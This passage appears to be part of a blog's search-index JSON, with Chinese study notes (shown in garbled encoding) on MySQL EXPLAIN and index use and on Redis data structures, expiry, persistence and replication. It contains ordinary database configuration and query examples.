éœ€è¦å›è¡¨. å…¶å®æ­¤æ—¶èµ°å¤åˆç´¢å¼•æ›´å¥½, æ‰€ä»¥ä¸å»ºè®®å¤åˆç´¢å¼•å’Œæ™®é€šç´¢å¼•ä¸€èµ·ç”¨\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys       | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a_b,idx_a,idx_b | idx_b | 4       | const | 1    | Using where | 18.12    |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys       | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a,idx_b | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n\n\n# 3. æŸ¥çœ‹ sql æ‰§è¡Œæ—¶é—´\n\n```bash\nset profiling = 1;\nshow profiles;\n```\n\n\n\n# 4. å¤´è„‘é£æš´\n\n+ order by æœ€å¥½å’Œ where ç”¨åŒä¸€ä¸ªå­—æ®µ, èƒ½æœ‰æ•ˆé¿å… Using filesort\n+ å°½é‡çš„æ‰©å±•ç´¢å¼•ï¼Œä¸è¦æ–°å»ºç´¢å¼•ã€‚æ¯”å¦‚è¡¨ä¸­å·²ç»æœ‰açš„ç´¢å¼•ï¼Œç°åœ¨è¦åŠ (a,b)çš„ç´¢å¼•ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹åŸæ¥çš„ç´¢å¼•å³å¯ã€‚\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://blog.souche.com/mysql-explain/\n+ https://segmentfault.com/a/1190000008131735","tags":["mysql"],"categories":["sql"]},{"title":"rediså­¦ä¹ ","url":"%2Fp%2F2a86dce.html","content":"\n# 0. å‰è¨€\n\nRedisæ˜¯ä¸€ä¸ªå¼€æºçš„ï¼Œ**åŸºäºå†…å­˜çš„æ•°æ®ç»“æ„å­˜å‚¨**ï¼Œå¯ç”¨ä½œäºæ•°æ®åº“ã€**ç¼“å­˜**ã€æ¶ˆæ¯ä¸­é—´ä»¶ã€‚\n\n- ä»å®˜æ–¹çš„è§£é‡Šä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼šRedisæ˜¯åŸºäºå†…å­˜ï¼Œæ”¯æŒå¤šç§æ•°æ®ç»“æ„ã€‚\n- ä»ç»éªŒçš„è§’åº¦ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼šRediså¸¸ç”¨ä½œäºç¼“å­˜ã€‚\n\n<!-- more -->\n\n# 1. Redis åº•å±‚æ•°æ®ç»“æ„\n\n\n+ ç®€å•åŠ¨æ€å­—ç¬¦ä¸²(Simple dynamic string,SDS)\n\n+ æ— ç¯åŒå‘é“¾è¡¨(linkedlist)\n\n+ å“ˆå¸Œè¡¨\n\n+ è·³è·ƒè¡¨(shiplist)\n\n+ æ•´æ•°é›†åˆ(intset)\n\n+ å‹ç¼©åˆ—è¡¨(ziplist)\n\n# 2. Redis æ•°æ®å¯¹è±¡\n\né¦–å…ˆè¿˜æ˜¯å¾—å£°æ˜ä¸€ä¸‹ï¼ŒRedisçš„å­˜å‚¨æ˜¯ä»¥`key-value`çš„å½¢å¼çš„ã€‚Redisä¸­çš„keyä¸€å®šæ˜¯å­—ç¬¦ä¸²ï¼Œvalueå¯ä»¥æ˜¯stringã€listã€hashã€setã€sortsetè¿™å‡ ç§å¸¸ç”¨çš„ã€‚\n\n| ç±»å‹    | ä½œç”¨                                               | åº•å±‚æ•°æ®ç»“æ„          |\n| ------- | -------------------------------------------------- | --------------------- |\n| string  | ç®€å•çš„key-value                                    | int, embstr(sds), raw |\n| list    | æœ‰åºåˆ—è¡¨,å¯åšç®€å•é˜Ÿåˆ—                              | å‹ç¼©åˆ—è¡¨,åŒå‘é“¾è¡¨     |\n| hash    | å“ˆå¸Œè¡¨, å­˜å‚¨ç»“æ„åŒ–æ•°æ®                             | å‹ç¼©åˆ—è¡¨,å“ˆå¸Œ table   |\n| set     | æ— åºåˆ—è¡¨(å»é‡), æä¾›ä¸€ç³»åˆ—çš„äº¤é›†ã€å¹¶é›†ã€å·®é›†çš„å‘½ä»¤ | æ•´æ•°é›†åˆ,å“ˆå¸Œ table   |\n| sortset | æœ‰åºé›†åˆæ˜ å°„, æ’è¡Œæ¦œ                               | å‹ç¼©åˆ—è¡¨, è·³è·ƒè¡¨      |\n\n![1](rediså­¦ä¹ /1.png)\n\n\n\n### 2.1 å­—ç¬¦ä¸²(stirng)å¯¹è±¡\n\nåœ¨ä¸Šé¢çš„å›¾æˆ‘ä»¬çŸ¥é“stringç±»å‹æœ‰ä¸‰ç§**ç¼–ç æ ¼å¼**ï¼š\n\n- intï¼šæ•´æ•°å€¼ï¼Œè¿™ä¸ªæ•´æ•°å€¼å¯ä»¥ä½¿ç”¨longç±»å‹æ¥è¡¨ç¤º\n  + å¦‚æœæ˜¯æµ®ç‚¹æ•°ï¼Œé‚£å°±ç”¨embstræˆ–è€…rawç¼–ç ã€‚å…·ä½“ç”¨å“ªä¸ªå°±çœ‹è¿™ä¸ªæ•°çš„é•¿åº¦äº†\n\n- embstrï¼šå­—ç¬¦ä¸²å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å€¼çš„é•¿åº¦å°äº32å­—èŠ‚\n\n- rawï¼šå­—ç¬¦ä¸²å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å€¼çš„é•¿åº¦å¤§äº32å­—èŠ‚\n\nembstrå’Œrawçš„**åŒºåˆ«**ï¼š\n\n- rawåˆ†é…å†…å­˜å’Œé‡Šæ”¾å†…å­˜çš„æ¬¡æ•°æ˜¯ä¸¤æ¬¡ï¼Œembstræ˜¯ä¸€æ¬¡\n- embstrç¼–ç çš„æ•°æ®ä¿å­˜åœ¨ä¸€å—**è¿ç»­**çš„å†…å­˜é‡Œé¢\n\nç¼–ç ä¹‹é—´çš„**è½¬æ¢**ï¼š\n\n- intç±»å‹å¦‚æœå­˜çš„**ä¸å†æ˜¯ä¸€ä¸ªæ•´æ•°å€¼**ï¼Œåˆ™ä¼šä»intè½¬æˆraw\n- embstræ˜¯åªè¯»çš„ï¼Œåœ¨ä¿®æ”¹çš„æ—¶å€™å›ä»embstrè½¬æˆraw\n\n\n\n### 2.2 åˆ—è¡¨(list)å¯¹è±¡\n\n- ziplistï¼šå­—ç¬¦ä¸²å…ƒç´ çš„é•¿åº¦éƒ½å°äº64ä¸ªå­—èŠ‚`&&`æ€»æ•°é‡å°‘äº512ä¸ª\n- linkedlistï¼šå­—ç¬¦ä¸²å…ƒç´ çš„é•¿åº¦å¤§äº64ä¸ªå­—èŠ‚`||`æ€»æ•°é‡å¤§äº512ä¸ª\n\nç¼–ç ä¹‹é—´çš„**è½¬æ¢ï¼š**\n\n- åŸæœ¬æ˜¯ziplistç¼–ç çš„ï¼Œå¦‚æœä¿å­˜çš„æ•°æ®é•¿åº¦å¤ªå¤§æˆ–è€…å…ƒç´ æ•°é‡è¿‡å¤šï¼Œä¼šè½¬æ¢æˆlinkedlistç¼–ç çš„ã€‚\n\n\n\n### 2.3 å“ˆå¸Œ(hash)å¯¹è±¡\n\n- ziplistï¼škeyå’Œvalueçš„å­—ç¬¦ä¸²é•¿åº¦éƒ½å°äº64å­—èŠ‚`&&`é”®å€¼å¯¹æ€»æ•°é‡å°äº512\n- hashtableï¼škeyå’Œvalueçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº64å­—èŠ‚`||`é”®å€¼å¯¹æ€»æ•°é‡å¤§äº512\n\nç¼–ç ä¹‹é—´çš„**è½¬æ¢ï¼š**\n\n- åŸæœ¬æ˜¯ziplistç¼–ç çš„ï¼Œå¦‚æœä¿å­˜çš„æ•°æ®é•¿åº¦å¤ªå¤§æˆ–è€…å…ƒç´ æ•°é‡è¿‡å¤šï¼Œä¼šè½¬æ¢æˆhashtableç¼–ç çš„ã€‚\n\n\n\n### 1.4 é›†åˆ(set)å¯¹è±¡\n\n- intsetï¼šä¿å­˜çš„å…ƒç´ å…¨éƒ½æ˜¯æ•´æ•°`&&`æ€»æ•°é‡å°äº512\n- hashtableï¼šä¿å­˜çš„å…ƒç´ ä¸æ˜¯æ•´æ•°`||`æ€»æ•°é‡å¤§äº512\n\nç¼–ç ä¹‹é—´çš„**è½¬æ¢ï¼š**\n\n- åŸæœ¬æ˜¯intsetç¼–ç çš„ï¼Œå¦‚æœä¿å­˜çš„æ•°æ®ä¸æ˜¯æ•´æ•°å€¼æˆ–è€…å…ƒç´ æ•°é‡å¤§äº512ï¼Œä¼šè½¬æ¢æˆhashtableç¼–ç çš„ã€‚\n\n\n\n### 2.5 æœ‰åºé›†åˆ(sortset)å¯¹è±¡\n\n- ziplistï¼šå…ƒç´ é•¿åº¦å°äº64`&&`æ€»æ•°é‡å°äº128\n- skiplistï¼šå…ƒç´ é•¿åº¦å¤§äº64`||`æ€»æ•°é‡å¤§äº128\n\næœ‰åºé›†åˆ(sortset)å¯¹è±¡**åŒæ—¶é‡‡ç”¨skiplistå’Œå“ˆå¸Œè¡¨æ¥å®ç°**ï¼š\n\n- skiplistèƒ½å¤Ÿè¾¾åˆ°æ’å…¥çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(logn)ï¼Œæ ¹æ®æˆå‘˜æŸ¥åˆ†å€¼çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(1)\n\nç¼–ç ä¹‹é—´çš„**è½¬æ¢ï¼š**\n\n- åŸæœ¬æ˜¯ziplistç¼–ç çš„ï¼Œå¦‚æœä¿å­˜çš„æ•°æ®é•¿åº¦å¤§äº64æˆ–è€…å…ƒç´ æ•°é‡å¤§äº128ï¼Œä¼šè½¬æ¢æˆskiplistç¼–ç çš„ã€‚\n\n\n\n# 3. Redis è¿‡æœŸç­–ç•¥\n\nRedisæœåŠ¡å™¨ä¸­ä¹Ÿæœ‰æ•°æ®åº“è¿™ä¹ˆä¸€ä¸ªæ¦‚å¿µã€‚å¦‚æœä¸æŒ‡å®šå…·ä½“çš„æ•°é‡ï¼Œé»˜è®¤ä¼šæœ‰16ä¸ªæ•°æ®åº“(0-15)ã€‚æ•°æ®åº“ä¸æ•°æ®åº“ä¹‹é—´çš„æ•°æ®æ˜¯éš”ç¦»çš„ã€‚\n\n### 3.1 è¿‡æœŸæ—¶é—´\n\nå› ä¸ºæˆ‘ä»¬çš„å†…å­˜æ˜¯æœ‰é™çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šå¹²æ‰ä¸å¸¸ç”¨çš„æ•°æ®ï¼Œä¿ç•™å¸¸ç”¨çš„æ•°æ®ã€‚è¿™å°±éœ€è¦æˆ‘ä»¬è®¾ç½®ä¸€ä¸‹é”®çš„è¿‡æœŸ(ç”Ÿå­˜)æ—¶é—´äº†ã€‚\n\n+ è®¾ç½®é”®çš„ ç”Ÿå­˜æ—¶é—´ å¯ä»¥é€šè¿‡EXPIREæˆ–è€…PEXPIREå‘½ä»¤ã€‚\n\n+ è®¾ç½®é”®çš„ è¿‡æœŸæ—¶é—´ å¯ä»¥é€šè¿‡EXPIREATæˆ–è€…PEXPIREATå‘½ä»¤ã€‚\n\nå…¶å®EXPIREã€PEXPIREã€EXPIREATè¿™ä¸‰ä¸ªå‘½ä»¤éƒ½æ˜¯é€šè¿‡PEXPIREATå‘½ä»¤æ¥å®ç°çš„ã€‚\n\n### 3.2 è¿‡æœŸç­–ç•¥(3ç§)\n\nä¸Šé¢æˆ‘ä»¬å·²ç»èƒ½å¤Ÿäº†è§£åˆ°ï¼šè¿‡æœŸé”®æ˜¯ä¿å­˜åœ¨å“ˆå¸Œè¡¨ä¸­äº†ã€‚é‚£è¿™äº›è¿‡æœŸé”®åˆ°äº†è¿‡æœŸçš„æ—¶é—´ï¼Œå°±ä¼šç«‹é©¬è¢«åˆ é™¤æ‰å—ï¼Ÿï¼Ÿ\n\n- å®šæ—¶åˆ é™¤(å¯¹å†…å­˜å‹å¥½ï¼Œå¯¹CPUä¸å‹å¥½)\n\n  åˆ°æ—¶é—´ç‚¹ä¸Šå°±æŠŠæ‰€æœ‰è¿‡æœŸçš„é”®åˆ é™¤äº†ã€‚\n\n- æƒ°æ€§åˆ é™¤(å¯¹CPUæåº¦å‹å¥½ï¼Œå¯¹å†…å­˜æåº¦ä¸å‹å¥½)\n\n  æ¯æ¬¡ä»é”®ç©ºé—´å–é”®çš„æ—¶å€™ï¼Œåˆ¤æ–­ä¸€ä¸‹è¯¥é”®æ˜¯å¦è¿‡æœŸäº†ï¼Œå¦‚æœè¿‡æœŸäº†å°±åˆ é™¤ã€‚\n\n- å®šæœŸåˆ é™¤(æŠ˜ä¸­)\n\n  æ¯éš”ä¸€æ®µæ—¶é—´å»åˆ é™¤è¿‡æœŸé”®ï¼Œé™åˆ¶åˆ é™¤çš„æ‰§è¡Œæ—¶é•¿å’Œé¢‘ç‡ã€‚\n\n\nRedisé‡‡ç”¨çš„æ˜¯**æƒ°æ€§åˆ é™¤+å®šæœŸåˆ é™¤**ä¸¤ç§ç­–ç•¥ï¼Œæ‰€ä»¥è¯´ï¼Œåœ¨Redisé‡Œè¾¹å¦‚æœè¿‡æœŸé”®åˆ°äº†è¿‡æœŸçš„æ—¶é—´äº†ï¼Œæœªå¿…è¢«ç«‹é©¬åˆ é™¤çš„ï¼\n\n\n\n### 3.3 å†…å­˜æ·˜æ±°æœºåˆ¶(6ç§)\n\næˆ‘ä»¬å¯ä»¥è®¾ç½®å†…å­˜æœ€å¤§ä½¿ç”¨é‡ï¼Œå½“å†…å­˜ä½¿ç”¨é‡è¶…å‡ºæ—¶ï¼Œä¼šæ–½è¡Œæ•°æ®æ·˜æ±°ç­–ç•¥ã€‚\n\n![1](rediså­¦ä¹ /2.png)\n\n\n\n\nä¸€èˆ¬åœºæ™¯, ä½¿ç”¨ Redis ç¼“å­˜æ•°æ®æ—¶ï¼Œä¸ºäº†æé«˜ç¼“å­˜å‘½ä¸­ç‡ï¼Œéœ€è¦ä¿è¯ç¼“å­˜æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ã€‚å¯ä»¥å°†å†…å­˜æœ€å¤§ä½¿ç”¨é‡è®¾ç½®ä¸ºçƒ­ç‚¹æ•°æ®å ç”¨çš„å†…å­˜é‡ï¼Œç„¶åå¯ç”¨allkeys-lruæ·˜æ±°ç­–ç•¥ï¼Œå°†æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°\n\n\n\n# 4. Redis æŒä¹…åŒ–\n\nRedisæä¾›äº†ä¸¤ç§ä¸åŒçš„æŒä¹…åŒ–æ–¹æ³•æ¥è®²æ•°æ®å­˜å‚¨åˆ°ç¡¬ç›˜é‡Œè¾¹ã€‚\n\n### 4.1 RDB(å¿«ç…§æŒä¹…åŒ–)\n\nRDBæŒä¹…åŒ–å¯ä»¥æ‰‹åŠ¨æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æ ¹æ®æœåŠ¡å™¨é…ç½®å®šæœŸæ‰§è¡Œã€‚RDBæŒä¹…åŒ–æ‰€ç”Ÿæˆçš„RDBæ–‡ä»¶æ˜¯ä¸€ä¸ªç»è¿‡å‹ç¼©çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒRediså¯ä»¥å°†æŸä¸€æ—¶åˆ»çš„æ‰€æœ‰æ•°æ®ä¿å­˜åˆ°ä¸€ä¸ªRDBæ–‡ä»¶ä¸­dump.rdbã€‚RedisæœåŠ¡å™¨åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æœ‰RDBæ–‡ä»¶ï¼Œå°±ä¼šè‡ªåŠ¨è½½å…¥RDBæ–‡ä»¶(ä¸éœ€è¦äººå·¥å¹²é¢„)\n\næœ‰ä¸¤ä¸ªå‘½ä»¤å¯ä»¥ç”ŸæˆRDBæ–‡ä»¶ï¼š\n\n+ SAVE\tä¼šé˜»å¡RedisæœåŠ¡å™¨è¿›ç¨‹ï¼ŒæœåŠ¡å™¨ä¸èƒ½æ¥æ”¶ä»»ä½•è¯·æ±‚ï¼Œç›´åˆ°RDBæ–‡ä»¶åˆ›å»ºå®Œæ¯•ä¸ºæ­¢ã€‚\n\n+ BGSAVE `fork`å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è´Ÿè´£åˆ›å»ºRDBæ–‡ä»¶ï¼ŒæœåŠ¡å™¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ¥æ”¶è¯·æ±‚ã€‚\n\n  \n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨é…ç½®çš„æ–¹å¼æ¥å®šæœŸæ‰§è¡Œ, å¦‚æœä»¥ä¸‹çš„æ¡ä»¶è¢«è§¦å‘ï¼Œå°±ä¼šæ‰§è¡Œ`BGSAVE` å‘½ä»¤\n\n```shell\nsave 900 1              #åœ¨900ç§’(15åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰1ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼Œ\nsave 300 10             #åœ¨300ç§’(5åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰10ä¸ªkeyå‘ç”Ÿå˜åŒ–\nsave 60 10000       \t  #åœ¨60ç§’(1åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰10000ä¸ªkeyå‘ç”Ÿå˜åŒ–\n```\n\n\n\n### 4.2 AOF(æ–‡ä»¶è¿½åŠ )\n\nå½“RedisæœåŠ¡å™¨æ‰§è¡Œå†™å‘½ä»¤çš„æ—¶å€™ï¼Œå°†æ‰§è¡Œçš„å†™å‘½ä»¤ä¿å­˜åˆ°AOFæ–‡ä»¶ä¸­ã€‚AOFæ˜¯é€šè¿‡ä¿å­˜RedisæœåŠ¡å™¨æ‰€æ‰§è¡Œçš„å†™å‘½ä»¤æ¥è®°å½•æ•°æ®åº“çš„æ•°æ®çš„ã€‚\n\n```shell\nredis> SET meg \"hello\"\nOK\nredis> SADD fruits \"apple\" \"banana\" \"cherry\"\n(integer) 3\nredis> RPUSH numbers 128 256 512\n(integer) 3 \n```\n\n\n\næ¯ä¸ªå‘½ä»¤éƒ½ç”Ÿæˆä¸€æ¡è®°å½•ï¼Œå­˜åœ¨ AOF æ–‡ä»¶ä¸­ã€‚è¿™äº›éƒ½æ˜¯ä»¥Redisçš„å‘½ä»¤è¯·æ±‚åè®®æ ¼å¼ä¿å­˜çš„ã€‚è¯»å–çš„æ—¶å€™ï¼Œå†æŠŠè¿™äº›å‘½ä»¤æ‰§è¡Œä¸€éã€‚\n\n\n```shell\nappendfsync always     # æ¯æ¬¡æœ‰æ•°æ®ä¿®æ”¹å‘ç”Ÿæ—¶éƒ½ä¼šå†™å…¥AOFæ–‡ä»¶ã€‚\nappendfsync everysec   # æ¯ç§’é’ŸåŒæ­¥ä¸€æ¬¡ï¼Œè¯¥ç­–ç•¥ä¸ºAOFçš„é»˜è®¤ç­–ç•¥ã€‚\nappendfsync no         # ä»ä¸åŒæ­¥ã€‚é«˜æ•ˆä½†æ˜¯æ•°æ®ä¸ä¼šè¢«æŒä¹…åŒ–ã€‚\n```\n\n\n\nRediså°†AOFé‡å†™ç¨‹åºæ”¾åˆ°**å­è¿›ç¨‹**é‡Œæ‰§è¡Œ(`BGREWRITEAOF`å‘½ä»¤)ï¼Œåƒ`BGSAVE`å‘½ä»¤ä¸€æ ·forkå‡ºä¸€ä¸ªå­è¿›ç¨‹æ¥å®Œæˆé‡å†™AOFçš„æ“ä½œï¼Œä»è€Œä¸ä¼šå½±å“åˆ°ä¸»è¿›ç¨‹ã€‚\n\nAOFåå°é‡å†™æ˜¯ä¸ä¼šé˜»å¡ä¸»è¿›ç¨‹æ¥æ”¶è¯·æ±‚çš„ï¼Œæ–°çš„å†™å‘½ä»¤è¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´**å½“å‰æ•°æ®åº“å’Œé‡å†™åçš„AOFæ–‡ä»¶çš„æ•°æ®ä¸ä¸€è‡´**ï¼\n\nä¸ºäº†è§£å†³æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼ŒRedisæœåŠ¡å™¨è®¾ç½®äº†ä¸€ä¸ª**AOFé‡å†™ç¼“å†²åŒº**ï¼Œè¿™ä¸ªç¼“å­˜åŒºä¼šåœ¨æœåŠ¡å™¨**åˆ›å»ºå‡ºå­è¿›ç¨‹ä¹‹åä½¿ç”¨**ã€‚\n\n\n\n### 4.3 RDBå’ŒAOFå¯¹è¿‡æœŸé”®çš„ç­–ç•¥\n\n+ RDBæŒä¹…åŒ–å¯¹è¿‡æœŸé”®çš„ç­–ç•¥ï¼š\n  æ‰§è¡ŒSAVEæˆ–è€…BGSAVEå‘½ä»¤åˆ›å»ºå‡ºçš„RDBæ–‡ä»¶ï¼Œç¨‹åºä¼šå¯¹æ•°æ®åº“ä¸­çš„è¿‡æœŸé”®æ£€æŸ¥ï¼Œå·²è¿‡æœŸçš„é”®ä¸ä¼šä¿å­˜åœ¨RDBæ–‡ä»¶ä¸­ã€‚\n  è½½å…¥RDBæ–‡ä»¶æ—¶ï¼Œç¨‹åºåŒæ ·ä¼šå¯¹RDBæ–‡ä»¶ä¸­çš„é”®è¿›è¡Œæ£€æŸ¥ï¼Œè¿‡æœŸçš„é”®ä¼šè¢«å¿½ç•¥ã€‚\n\n+ AOFæŒä¹…åŒ–å¯¹è¿‡æœŸé”®çš„ç­–ç•¥ï¼š\n  å¦‚æœæ•°æ®åº“çš„é”®å·²è¿‡æœŸï¼Œä½†è¿˜æ²¡è¢«æƒ°æ€§/å®šæœŸåˆ é™¤ï¼ŒAOFæ–‡ä»¶ä¸ä¼šå› ä¸ºè¿™ä¸ªè¿‡æœŸé”®äº§ç”Ÿä»»ä½•å½±å“(ä¹Ÿå°±è¯´ä¼šä¿ç•™)ï¼Œå½“è¿‡æœŸçš„é”®è¢«åˆ é™¤äº†ä»¥åï¼Œä¼šè¿½åŠ ä¸€æ¡DELå‘½ä»¤æ¥æ˜¾ç¤ºè®°å½•è¯¥é”®è¢«åˆ é™¤äº†\n  é‡å†™AOFæ–‡ä»¶æ—¶ï¼Œç¨‹åºä¼šå¯¹RDBæ–‡ä»¶ä¸­çš„é”®è¿›è¡Œæ£€æŸ¥ï¼Œè¿‡æœŸçš„é”®ä¼šè¢«å¿½ç•¥ã€‚\n\n+ RDBå’ŒAOFç”¨å“ªä¸ªï¼Ÿ\n\n  RDBå’ŒAOFå¹¶ä¸äº’æ–¥ï¼Œå®ƒä¿©å¯ä»¥åŒæ—¶ä½¿ç”¨ã€‚\n\n  RDBçš„ä¼˜ç‚¹ï¼šè½½å…¥æ—¶æ¢å¤æ•°æ®å¿«ã€æ–‡ä»¶ä½“ç§¯å°ã€‚\n  RDBçš„ç¼ºç‚¹ï¼šä¼šä¸€å®šç¨‹åº¦ä¸Šä¸¢å¤±æ•°æ®(å› ä¸ºç³»ç»Ÿä¸€æ—¦åœ¨å®šæ—¶æŒä¹…åŒ–ä¹‹å‰å‡ºç°å®•æœºç°è±¡ï¼Œæ­¤å‰æ²¡æœ‰æ¥å¾—åŠå†™å…¥ç£ç›˜çš„æ•°æ®éƒ½å°†ä¸¢å¤±ã€‚)\n  AOFçš„ä¼˜ç‚¹ï¼šä¸¢å¤±æ•°æ®å°‘(é»˜è®¤é…ç½®åªä¸¢å¤±ä¸€ç§’çš„æ•°æ®)ã€‚\n  AOFçš„ç¼ºç‚¹ï¼šæ¢å¤æ•°æ®ç›¸å¯¹è¾ƒæ…¢ï¼Œæ–‡ä»¶ä½“ç§¯å¤§\n\n  å¦‚æœRedisæœåŠ¡å™¨åŒæ—¶å¼€å¯äº†RDBå’ŒAOFæŒä¹…åŒ–ï¼ŒæœåŠ¡å™¨ä¼šä¼˜å…ˆä½¿ç”¨AOFæ–‡ä»¶æ¥è¿˜åŸæ•°æ®(å› ä¸ºAOFæ›´æ–°é¢‘ç‡æ¯”RDBæ›´æ–°é¢‘ç‡è¦é«˜ï¼Œè¿˜åŸçš„æ•°æ®æ›´å®Œå–„)\n\n\n\n# 5. Redisäº‹ä»¶\n\nRedisæœåŠ¡å™¨æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ç¨‹åºï¼Œä¸»è¦å¤„ç†ä»¥ä¸‹ä¸¤ç±»äº‹ä»¶ï¼š\n\n### 5.1 æ–‡ä»¶äº‹ä»¶\n\næ–‡ä»¶äº‹ä»¶å…¶å®å°±æ˜¯å¯¹Socketæ“ä½œçš„æŠ½è±¡ï¼ŒRedisæœåŠ¡å™¨ä¸Rediså®¢æˆ·ç«¯çš„é€šä¿¡ä¼šäº§ç”Ÿæ–‡ä»¶äº‹ä»¶ï¼ŒæœåŠ¡å™¨é€šè¿‡ç›‘å¬å¹¶å¤„ç†è¿™äº›äº‹ä»¶æ¥å®Œæˆä¸€ç³»åˆ—çš„ç½‘ç»œæ“ä½œã€‚\n\næ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ä½¿ç”¨I/Oå¤šè·¯å¤ç”¨ï¼ˆEPOLLï¼‰ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªSocketã€‚å½“è¢«ç›‘å¬çš„Socketå‡†å¤‡å¥½æ‰§è¡Œè¿æ¥åº”ç­”(accept)ã€è¯»å–(read)ç­‰ç­‰æ“ä½œæ—¶ï¼Œä¸æ“ä½œç›¸å¯¹åº”çš„æ–‡ä»¶äº‹ä»¶å°±ä¼šäº§ç”Ÿï¼Œæ ¹æ®æ–‡ä»¶äº‹ä»¶æ¥ä¸ºSocketå…³è”å¯¹åº”çš„äº‹ä»¶å¤„ç†å™¨ï¼Œä»è€Œå®ç°åŠŸèƒ½ã€‚\n\n\n\n### 5.2 æ—¶é—´äº‹ä»¶\n\næŒç»­è¿è¡Œçš„RedisæœåŠ¡å™¨ä¼š**å®šæœŸ**å¯¹è‡ªèº«çš„èµ„æºå’ŒçŠ¶æ€è¿›è¡Œæ£€æŸ¥å’Œè°ƒæ•´ï¼Œè¿™äº›å®šæœŸçš„æ“ä½œç”±**serverCron**å‡½æ•°è´Ÿè´£æ‰§è¡Œï¼Œå®ƒçš„ä¸»è¦å·¥ä½œåŒ…æ‹¬ï¼š\n\n- æ›´æ–°æœåŠ¡å™¨çš„ç»Ÿè®¡ä¿¡æ¯(æ—¶é—´ã€å†…å­˜å ç”¨ã€æ•°æ®åº“å ç”¨)\n- æ¸…ç†æ•°æ®åº“çš„è¿‡æœŸé”®å€¼å¯¹\n- AOFã€RDBæŒä¹…åŒ–\n- å¦‚æœæ˜¯ä¸»ä»æœåŠ¡å™¨ï¼Œå¯¹ä»æœåŠ¡å™¨è¿›è¡Œå®šæœŸåŒæ­¥\n- å¦‚æœæ˜¯é›†ç¾¤æ¨¡å¼ï¼Œå¯¹è¿›ç¾¤è¿›è¡Œå®šæœŸåŒæ­¥å’Œè¿æ¥\n- â€¦\n\nRedisæœåŠ¡å™¨å°†æ—¶é—´äº‹ä»¶æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ï¼Œå½“æ—¶é—´äº‹ä»¶æ‰§è¡Œå™¨è¿è¡Œæ—¶ï¼Œä¼šéå†æ•´ä¸ªé“¾è¡¨ã€‚æ—¶é—´äº‹ä»¶åŒ…æ‹¬ï¼š\n\n+ å‘¨æœŸæ€§äº‹ä»¶(Redisä¸€èˆ¬åªæ‰§è¡ŒserverCronæ—¶é—´äº‹ä»¶ï¼ŒserverCronæ—¶é—´äº‹ä»¶æ˜¯å‘¨æœŸæ€§çš„)\n+ å®šæ—¶äº‹ä»¶\n\n\n\n### 5.3 Rediså•çº¿ç¨‹ä¸ºä»€ä¹ˆå¿«ï¼Ÿ\n\n1ï¼‰çº¯å†…å­˜æ“ä½œ\n2ï¼‰æ ¸å¿ƒæ˜¯åŸºäºéé˜»å¡çš„IOå¤šè·¯å¤ç”¨æœºåˆ¶\n3ï¼‰å•çº¿ç¨‹é¿å…äº†å¤šçº¿ç¨‹çš„é¢‘ç¹ä¸Šä¸‹æ–‡åˆ‡æ¢é—®é¢˜\n\n\n\n\n\n# 6. Redisä¸»ä»\n\n##### å®Œæ•´é‡åŒæ­¥\n\n+ ä»æœåŠ¡å™¨å‘ä¸»æœåŠ¡å™¨å‘é€PSYNCå‘½ä»¤\n\n+ ä¸»æœåŠ¡å™¨æ”¶åˆ°PSYNCå‘½ä»¤æ‰§è¡Œ`BGSAVE`å‘½ä»¤ï¼Œåœ¨åå°ç”Ÿæˆä¸€ä¸ª`RDB`æ–‡ä»¶ã€‚å¹¶ç”¨ä¸€ä¸ªç¼“å†²åŒºæ¥è®°å½•ä»ç°åœ¨å¼€å§‹æ‰§è¡Œçš„æ‰€æœ‰å†™å‘½ä»¤ã€‚\n\n+ å½“ä¸»æœåŠ¡å™¨çš„BGSAVEå‘½ä»¤æ‰§è¡Œå®Œåï¼Œå°†ç”Ÿæˆçš„RDBæ–‡ä»¶å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œä»æœåŠ¡å™¨æ¥æ”¶å’Œè½½å…¥RBDæ–‡ä»¶ã€‚å°†è‡ªå·±çš„æ•°æ®åº“çŠ¶æ€æ›´æ–°\n\n  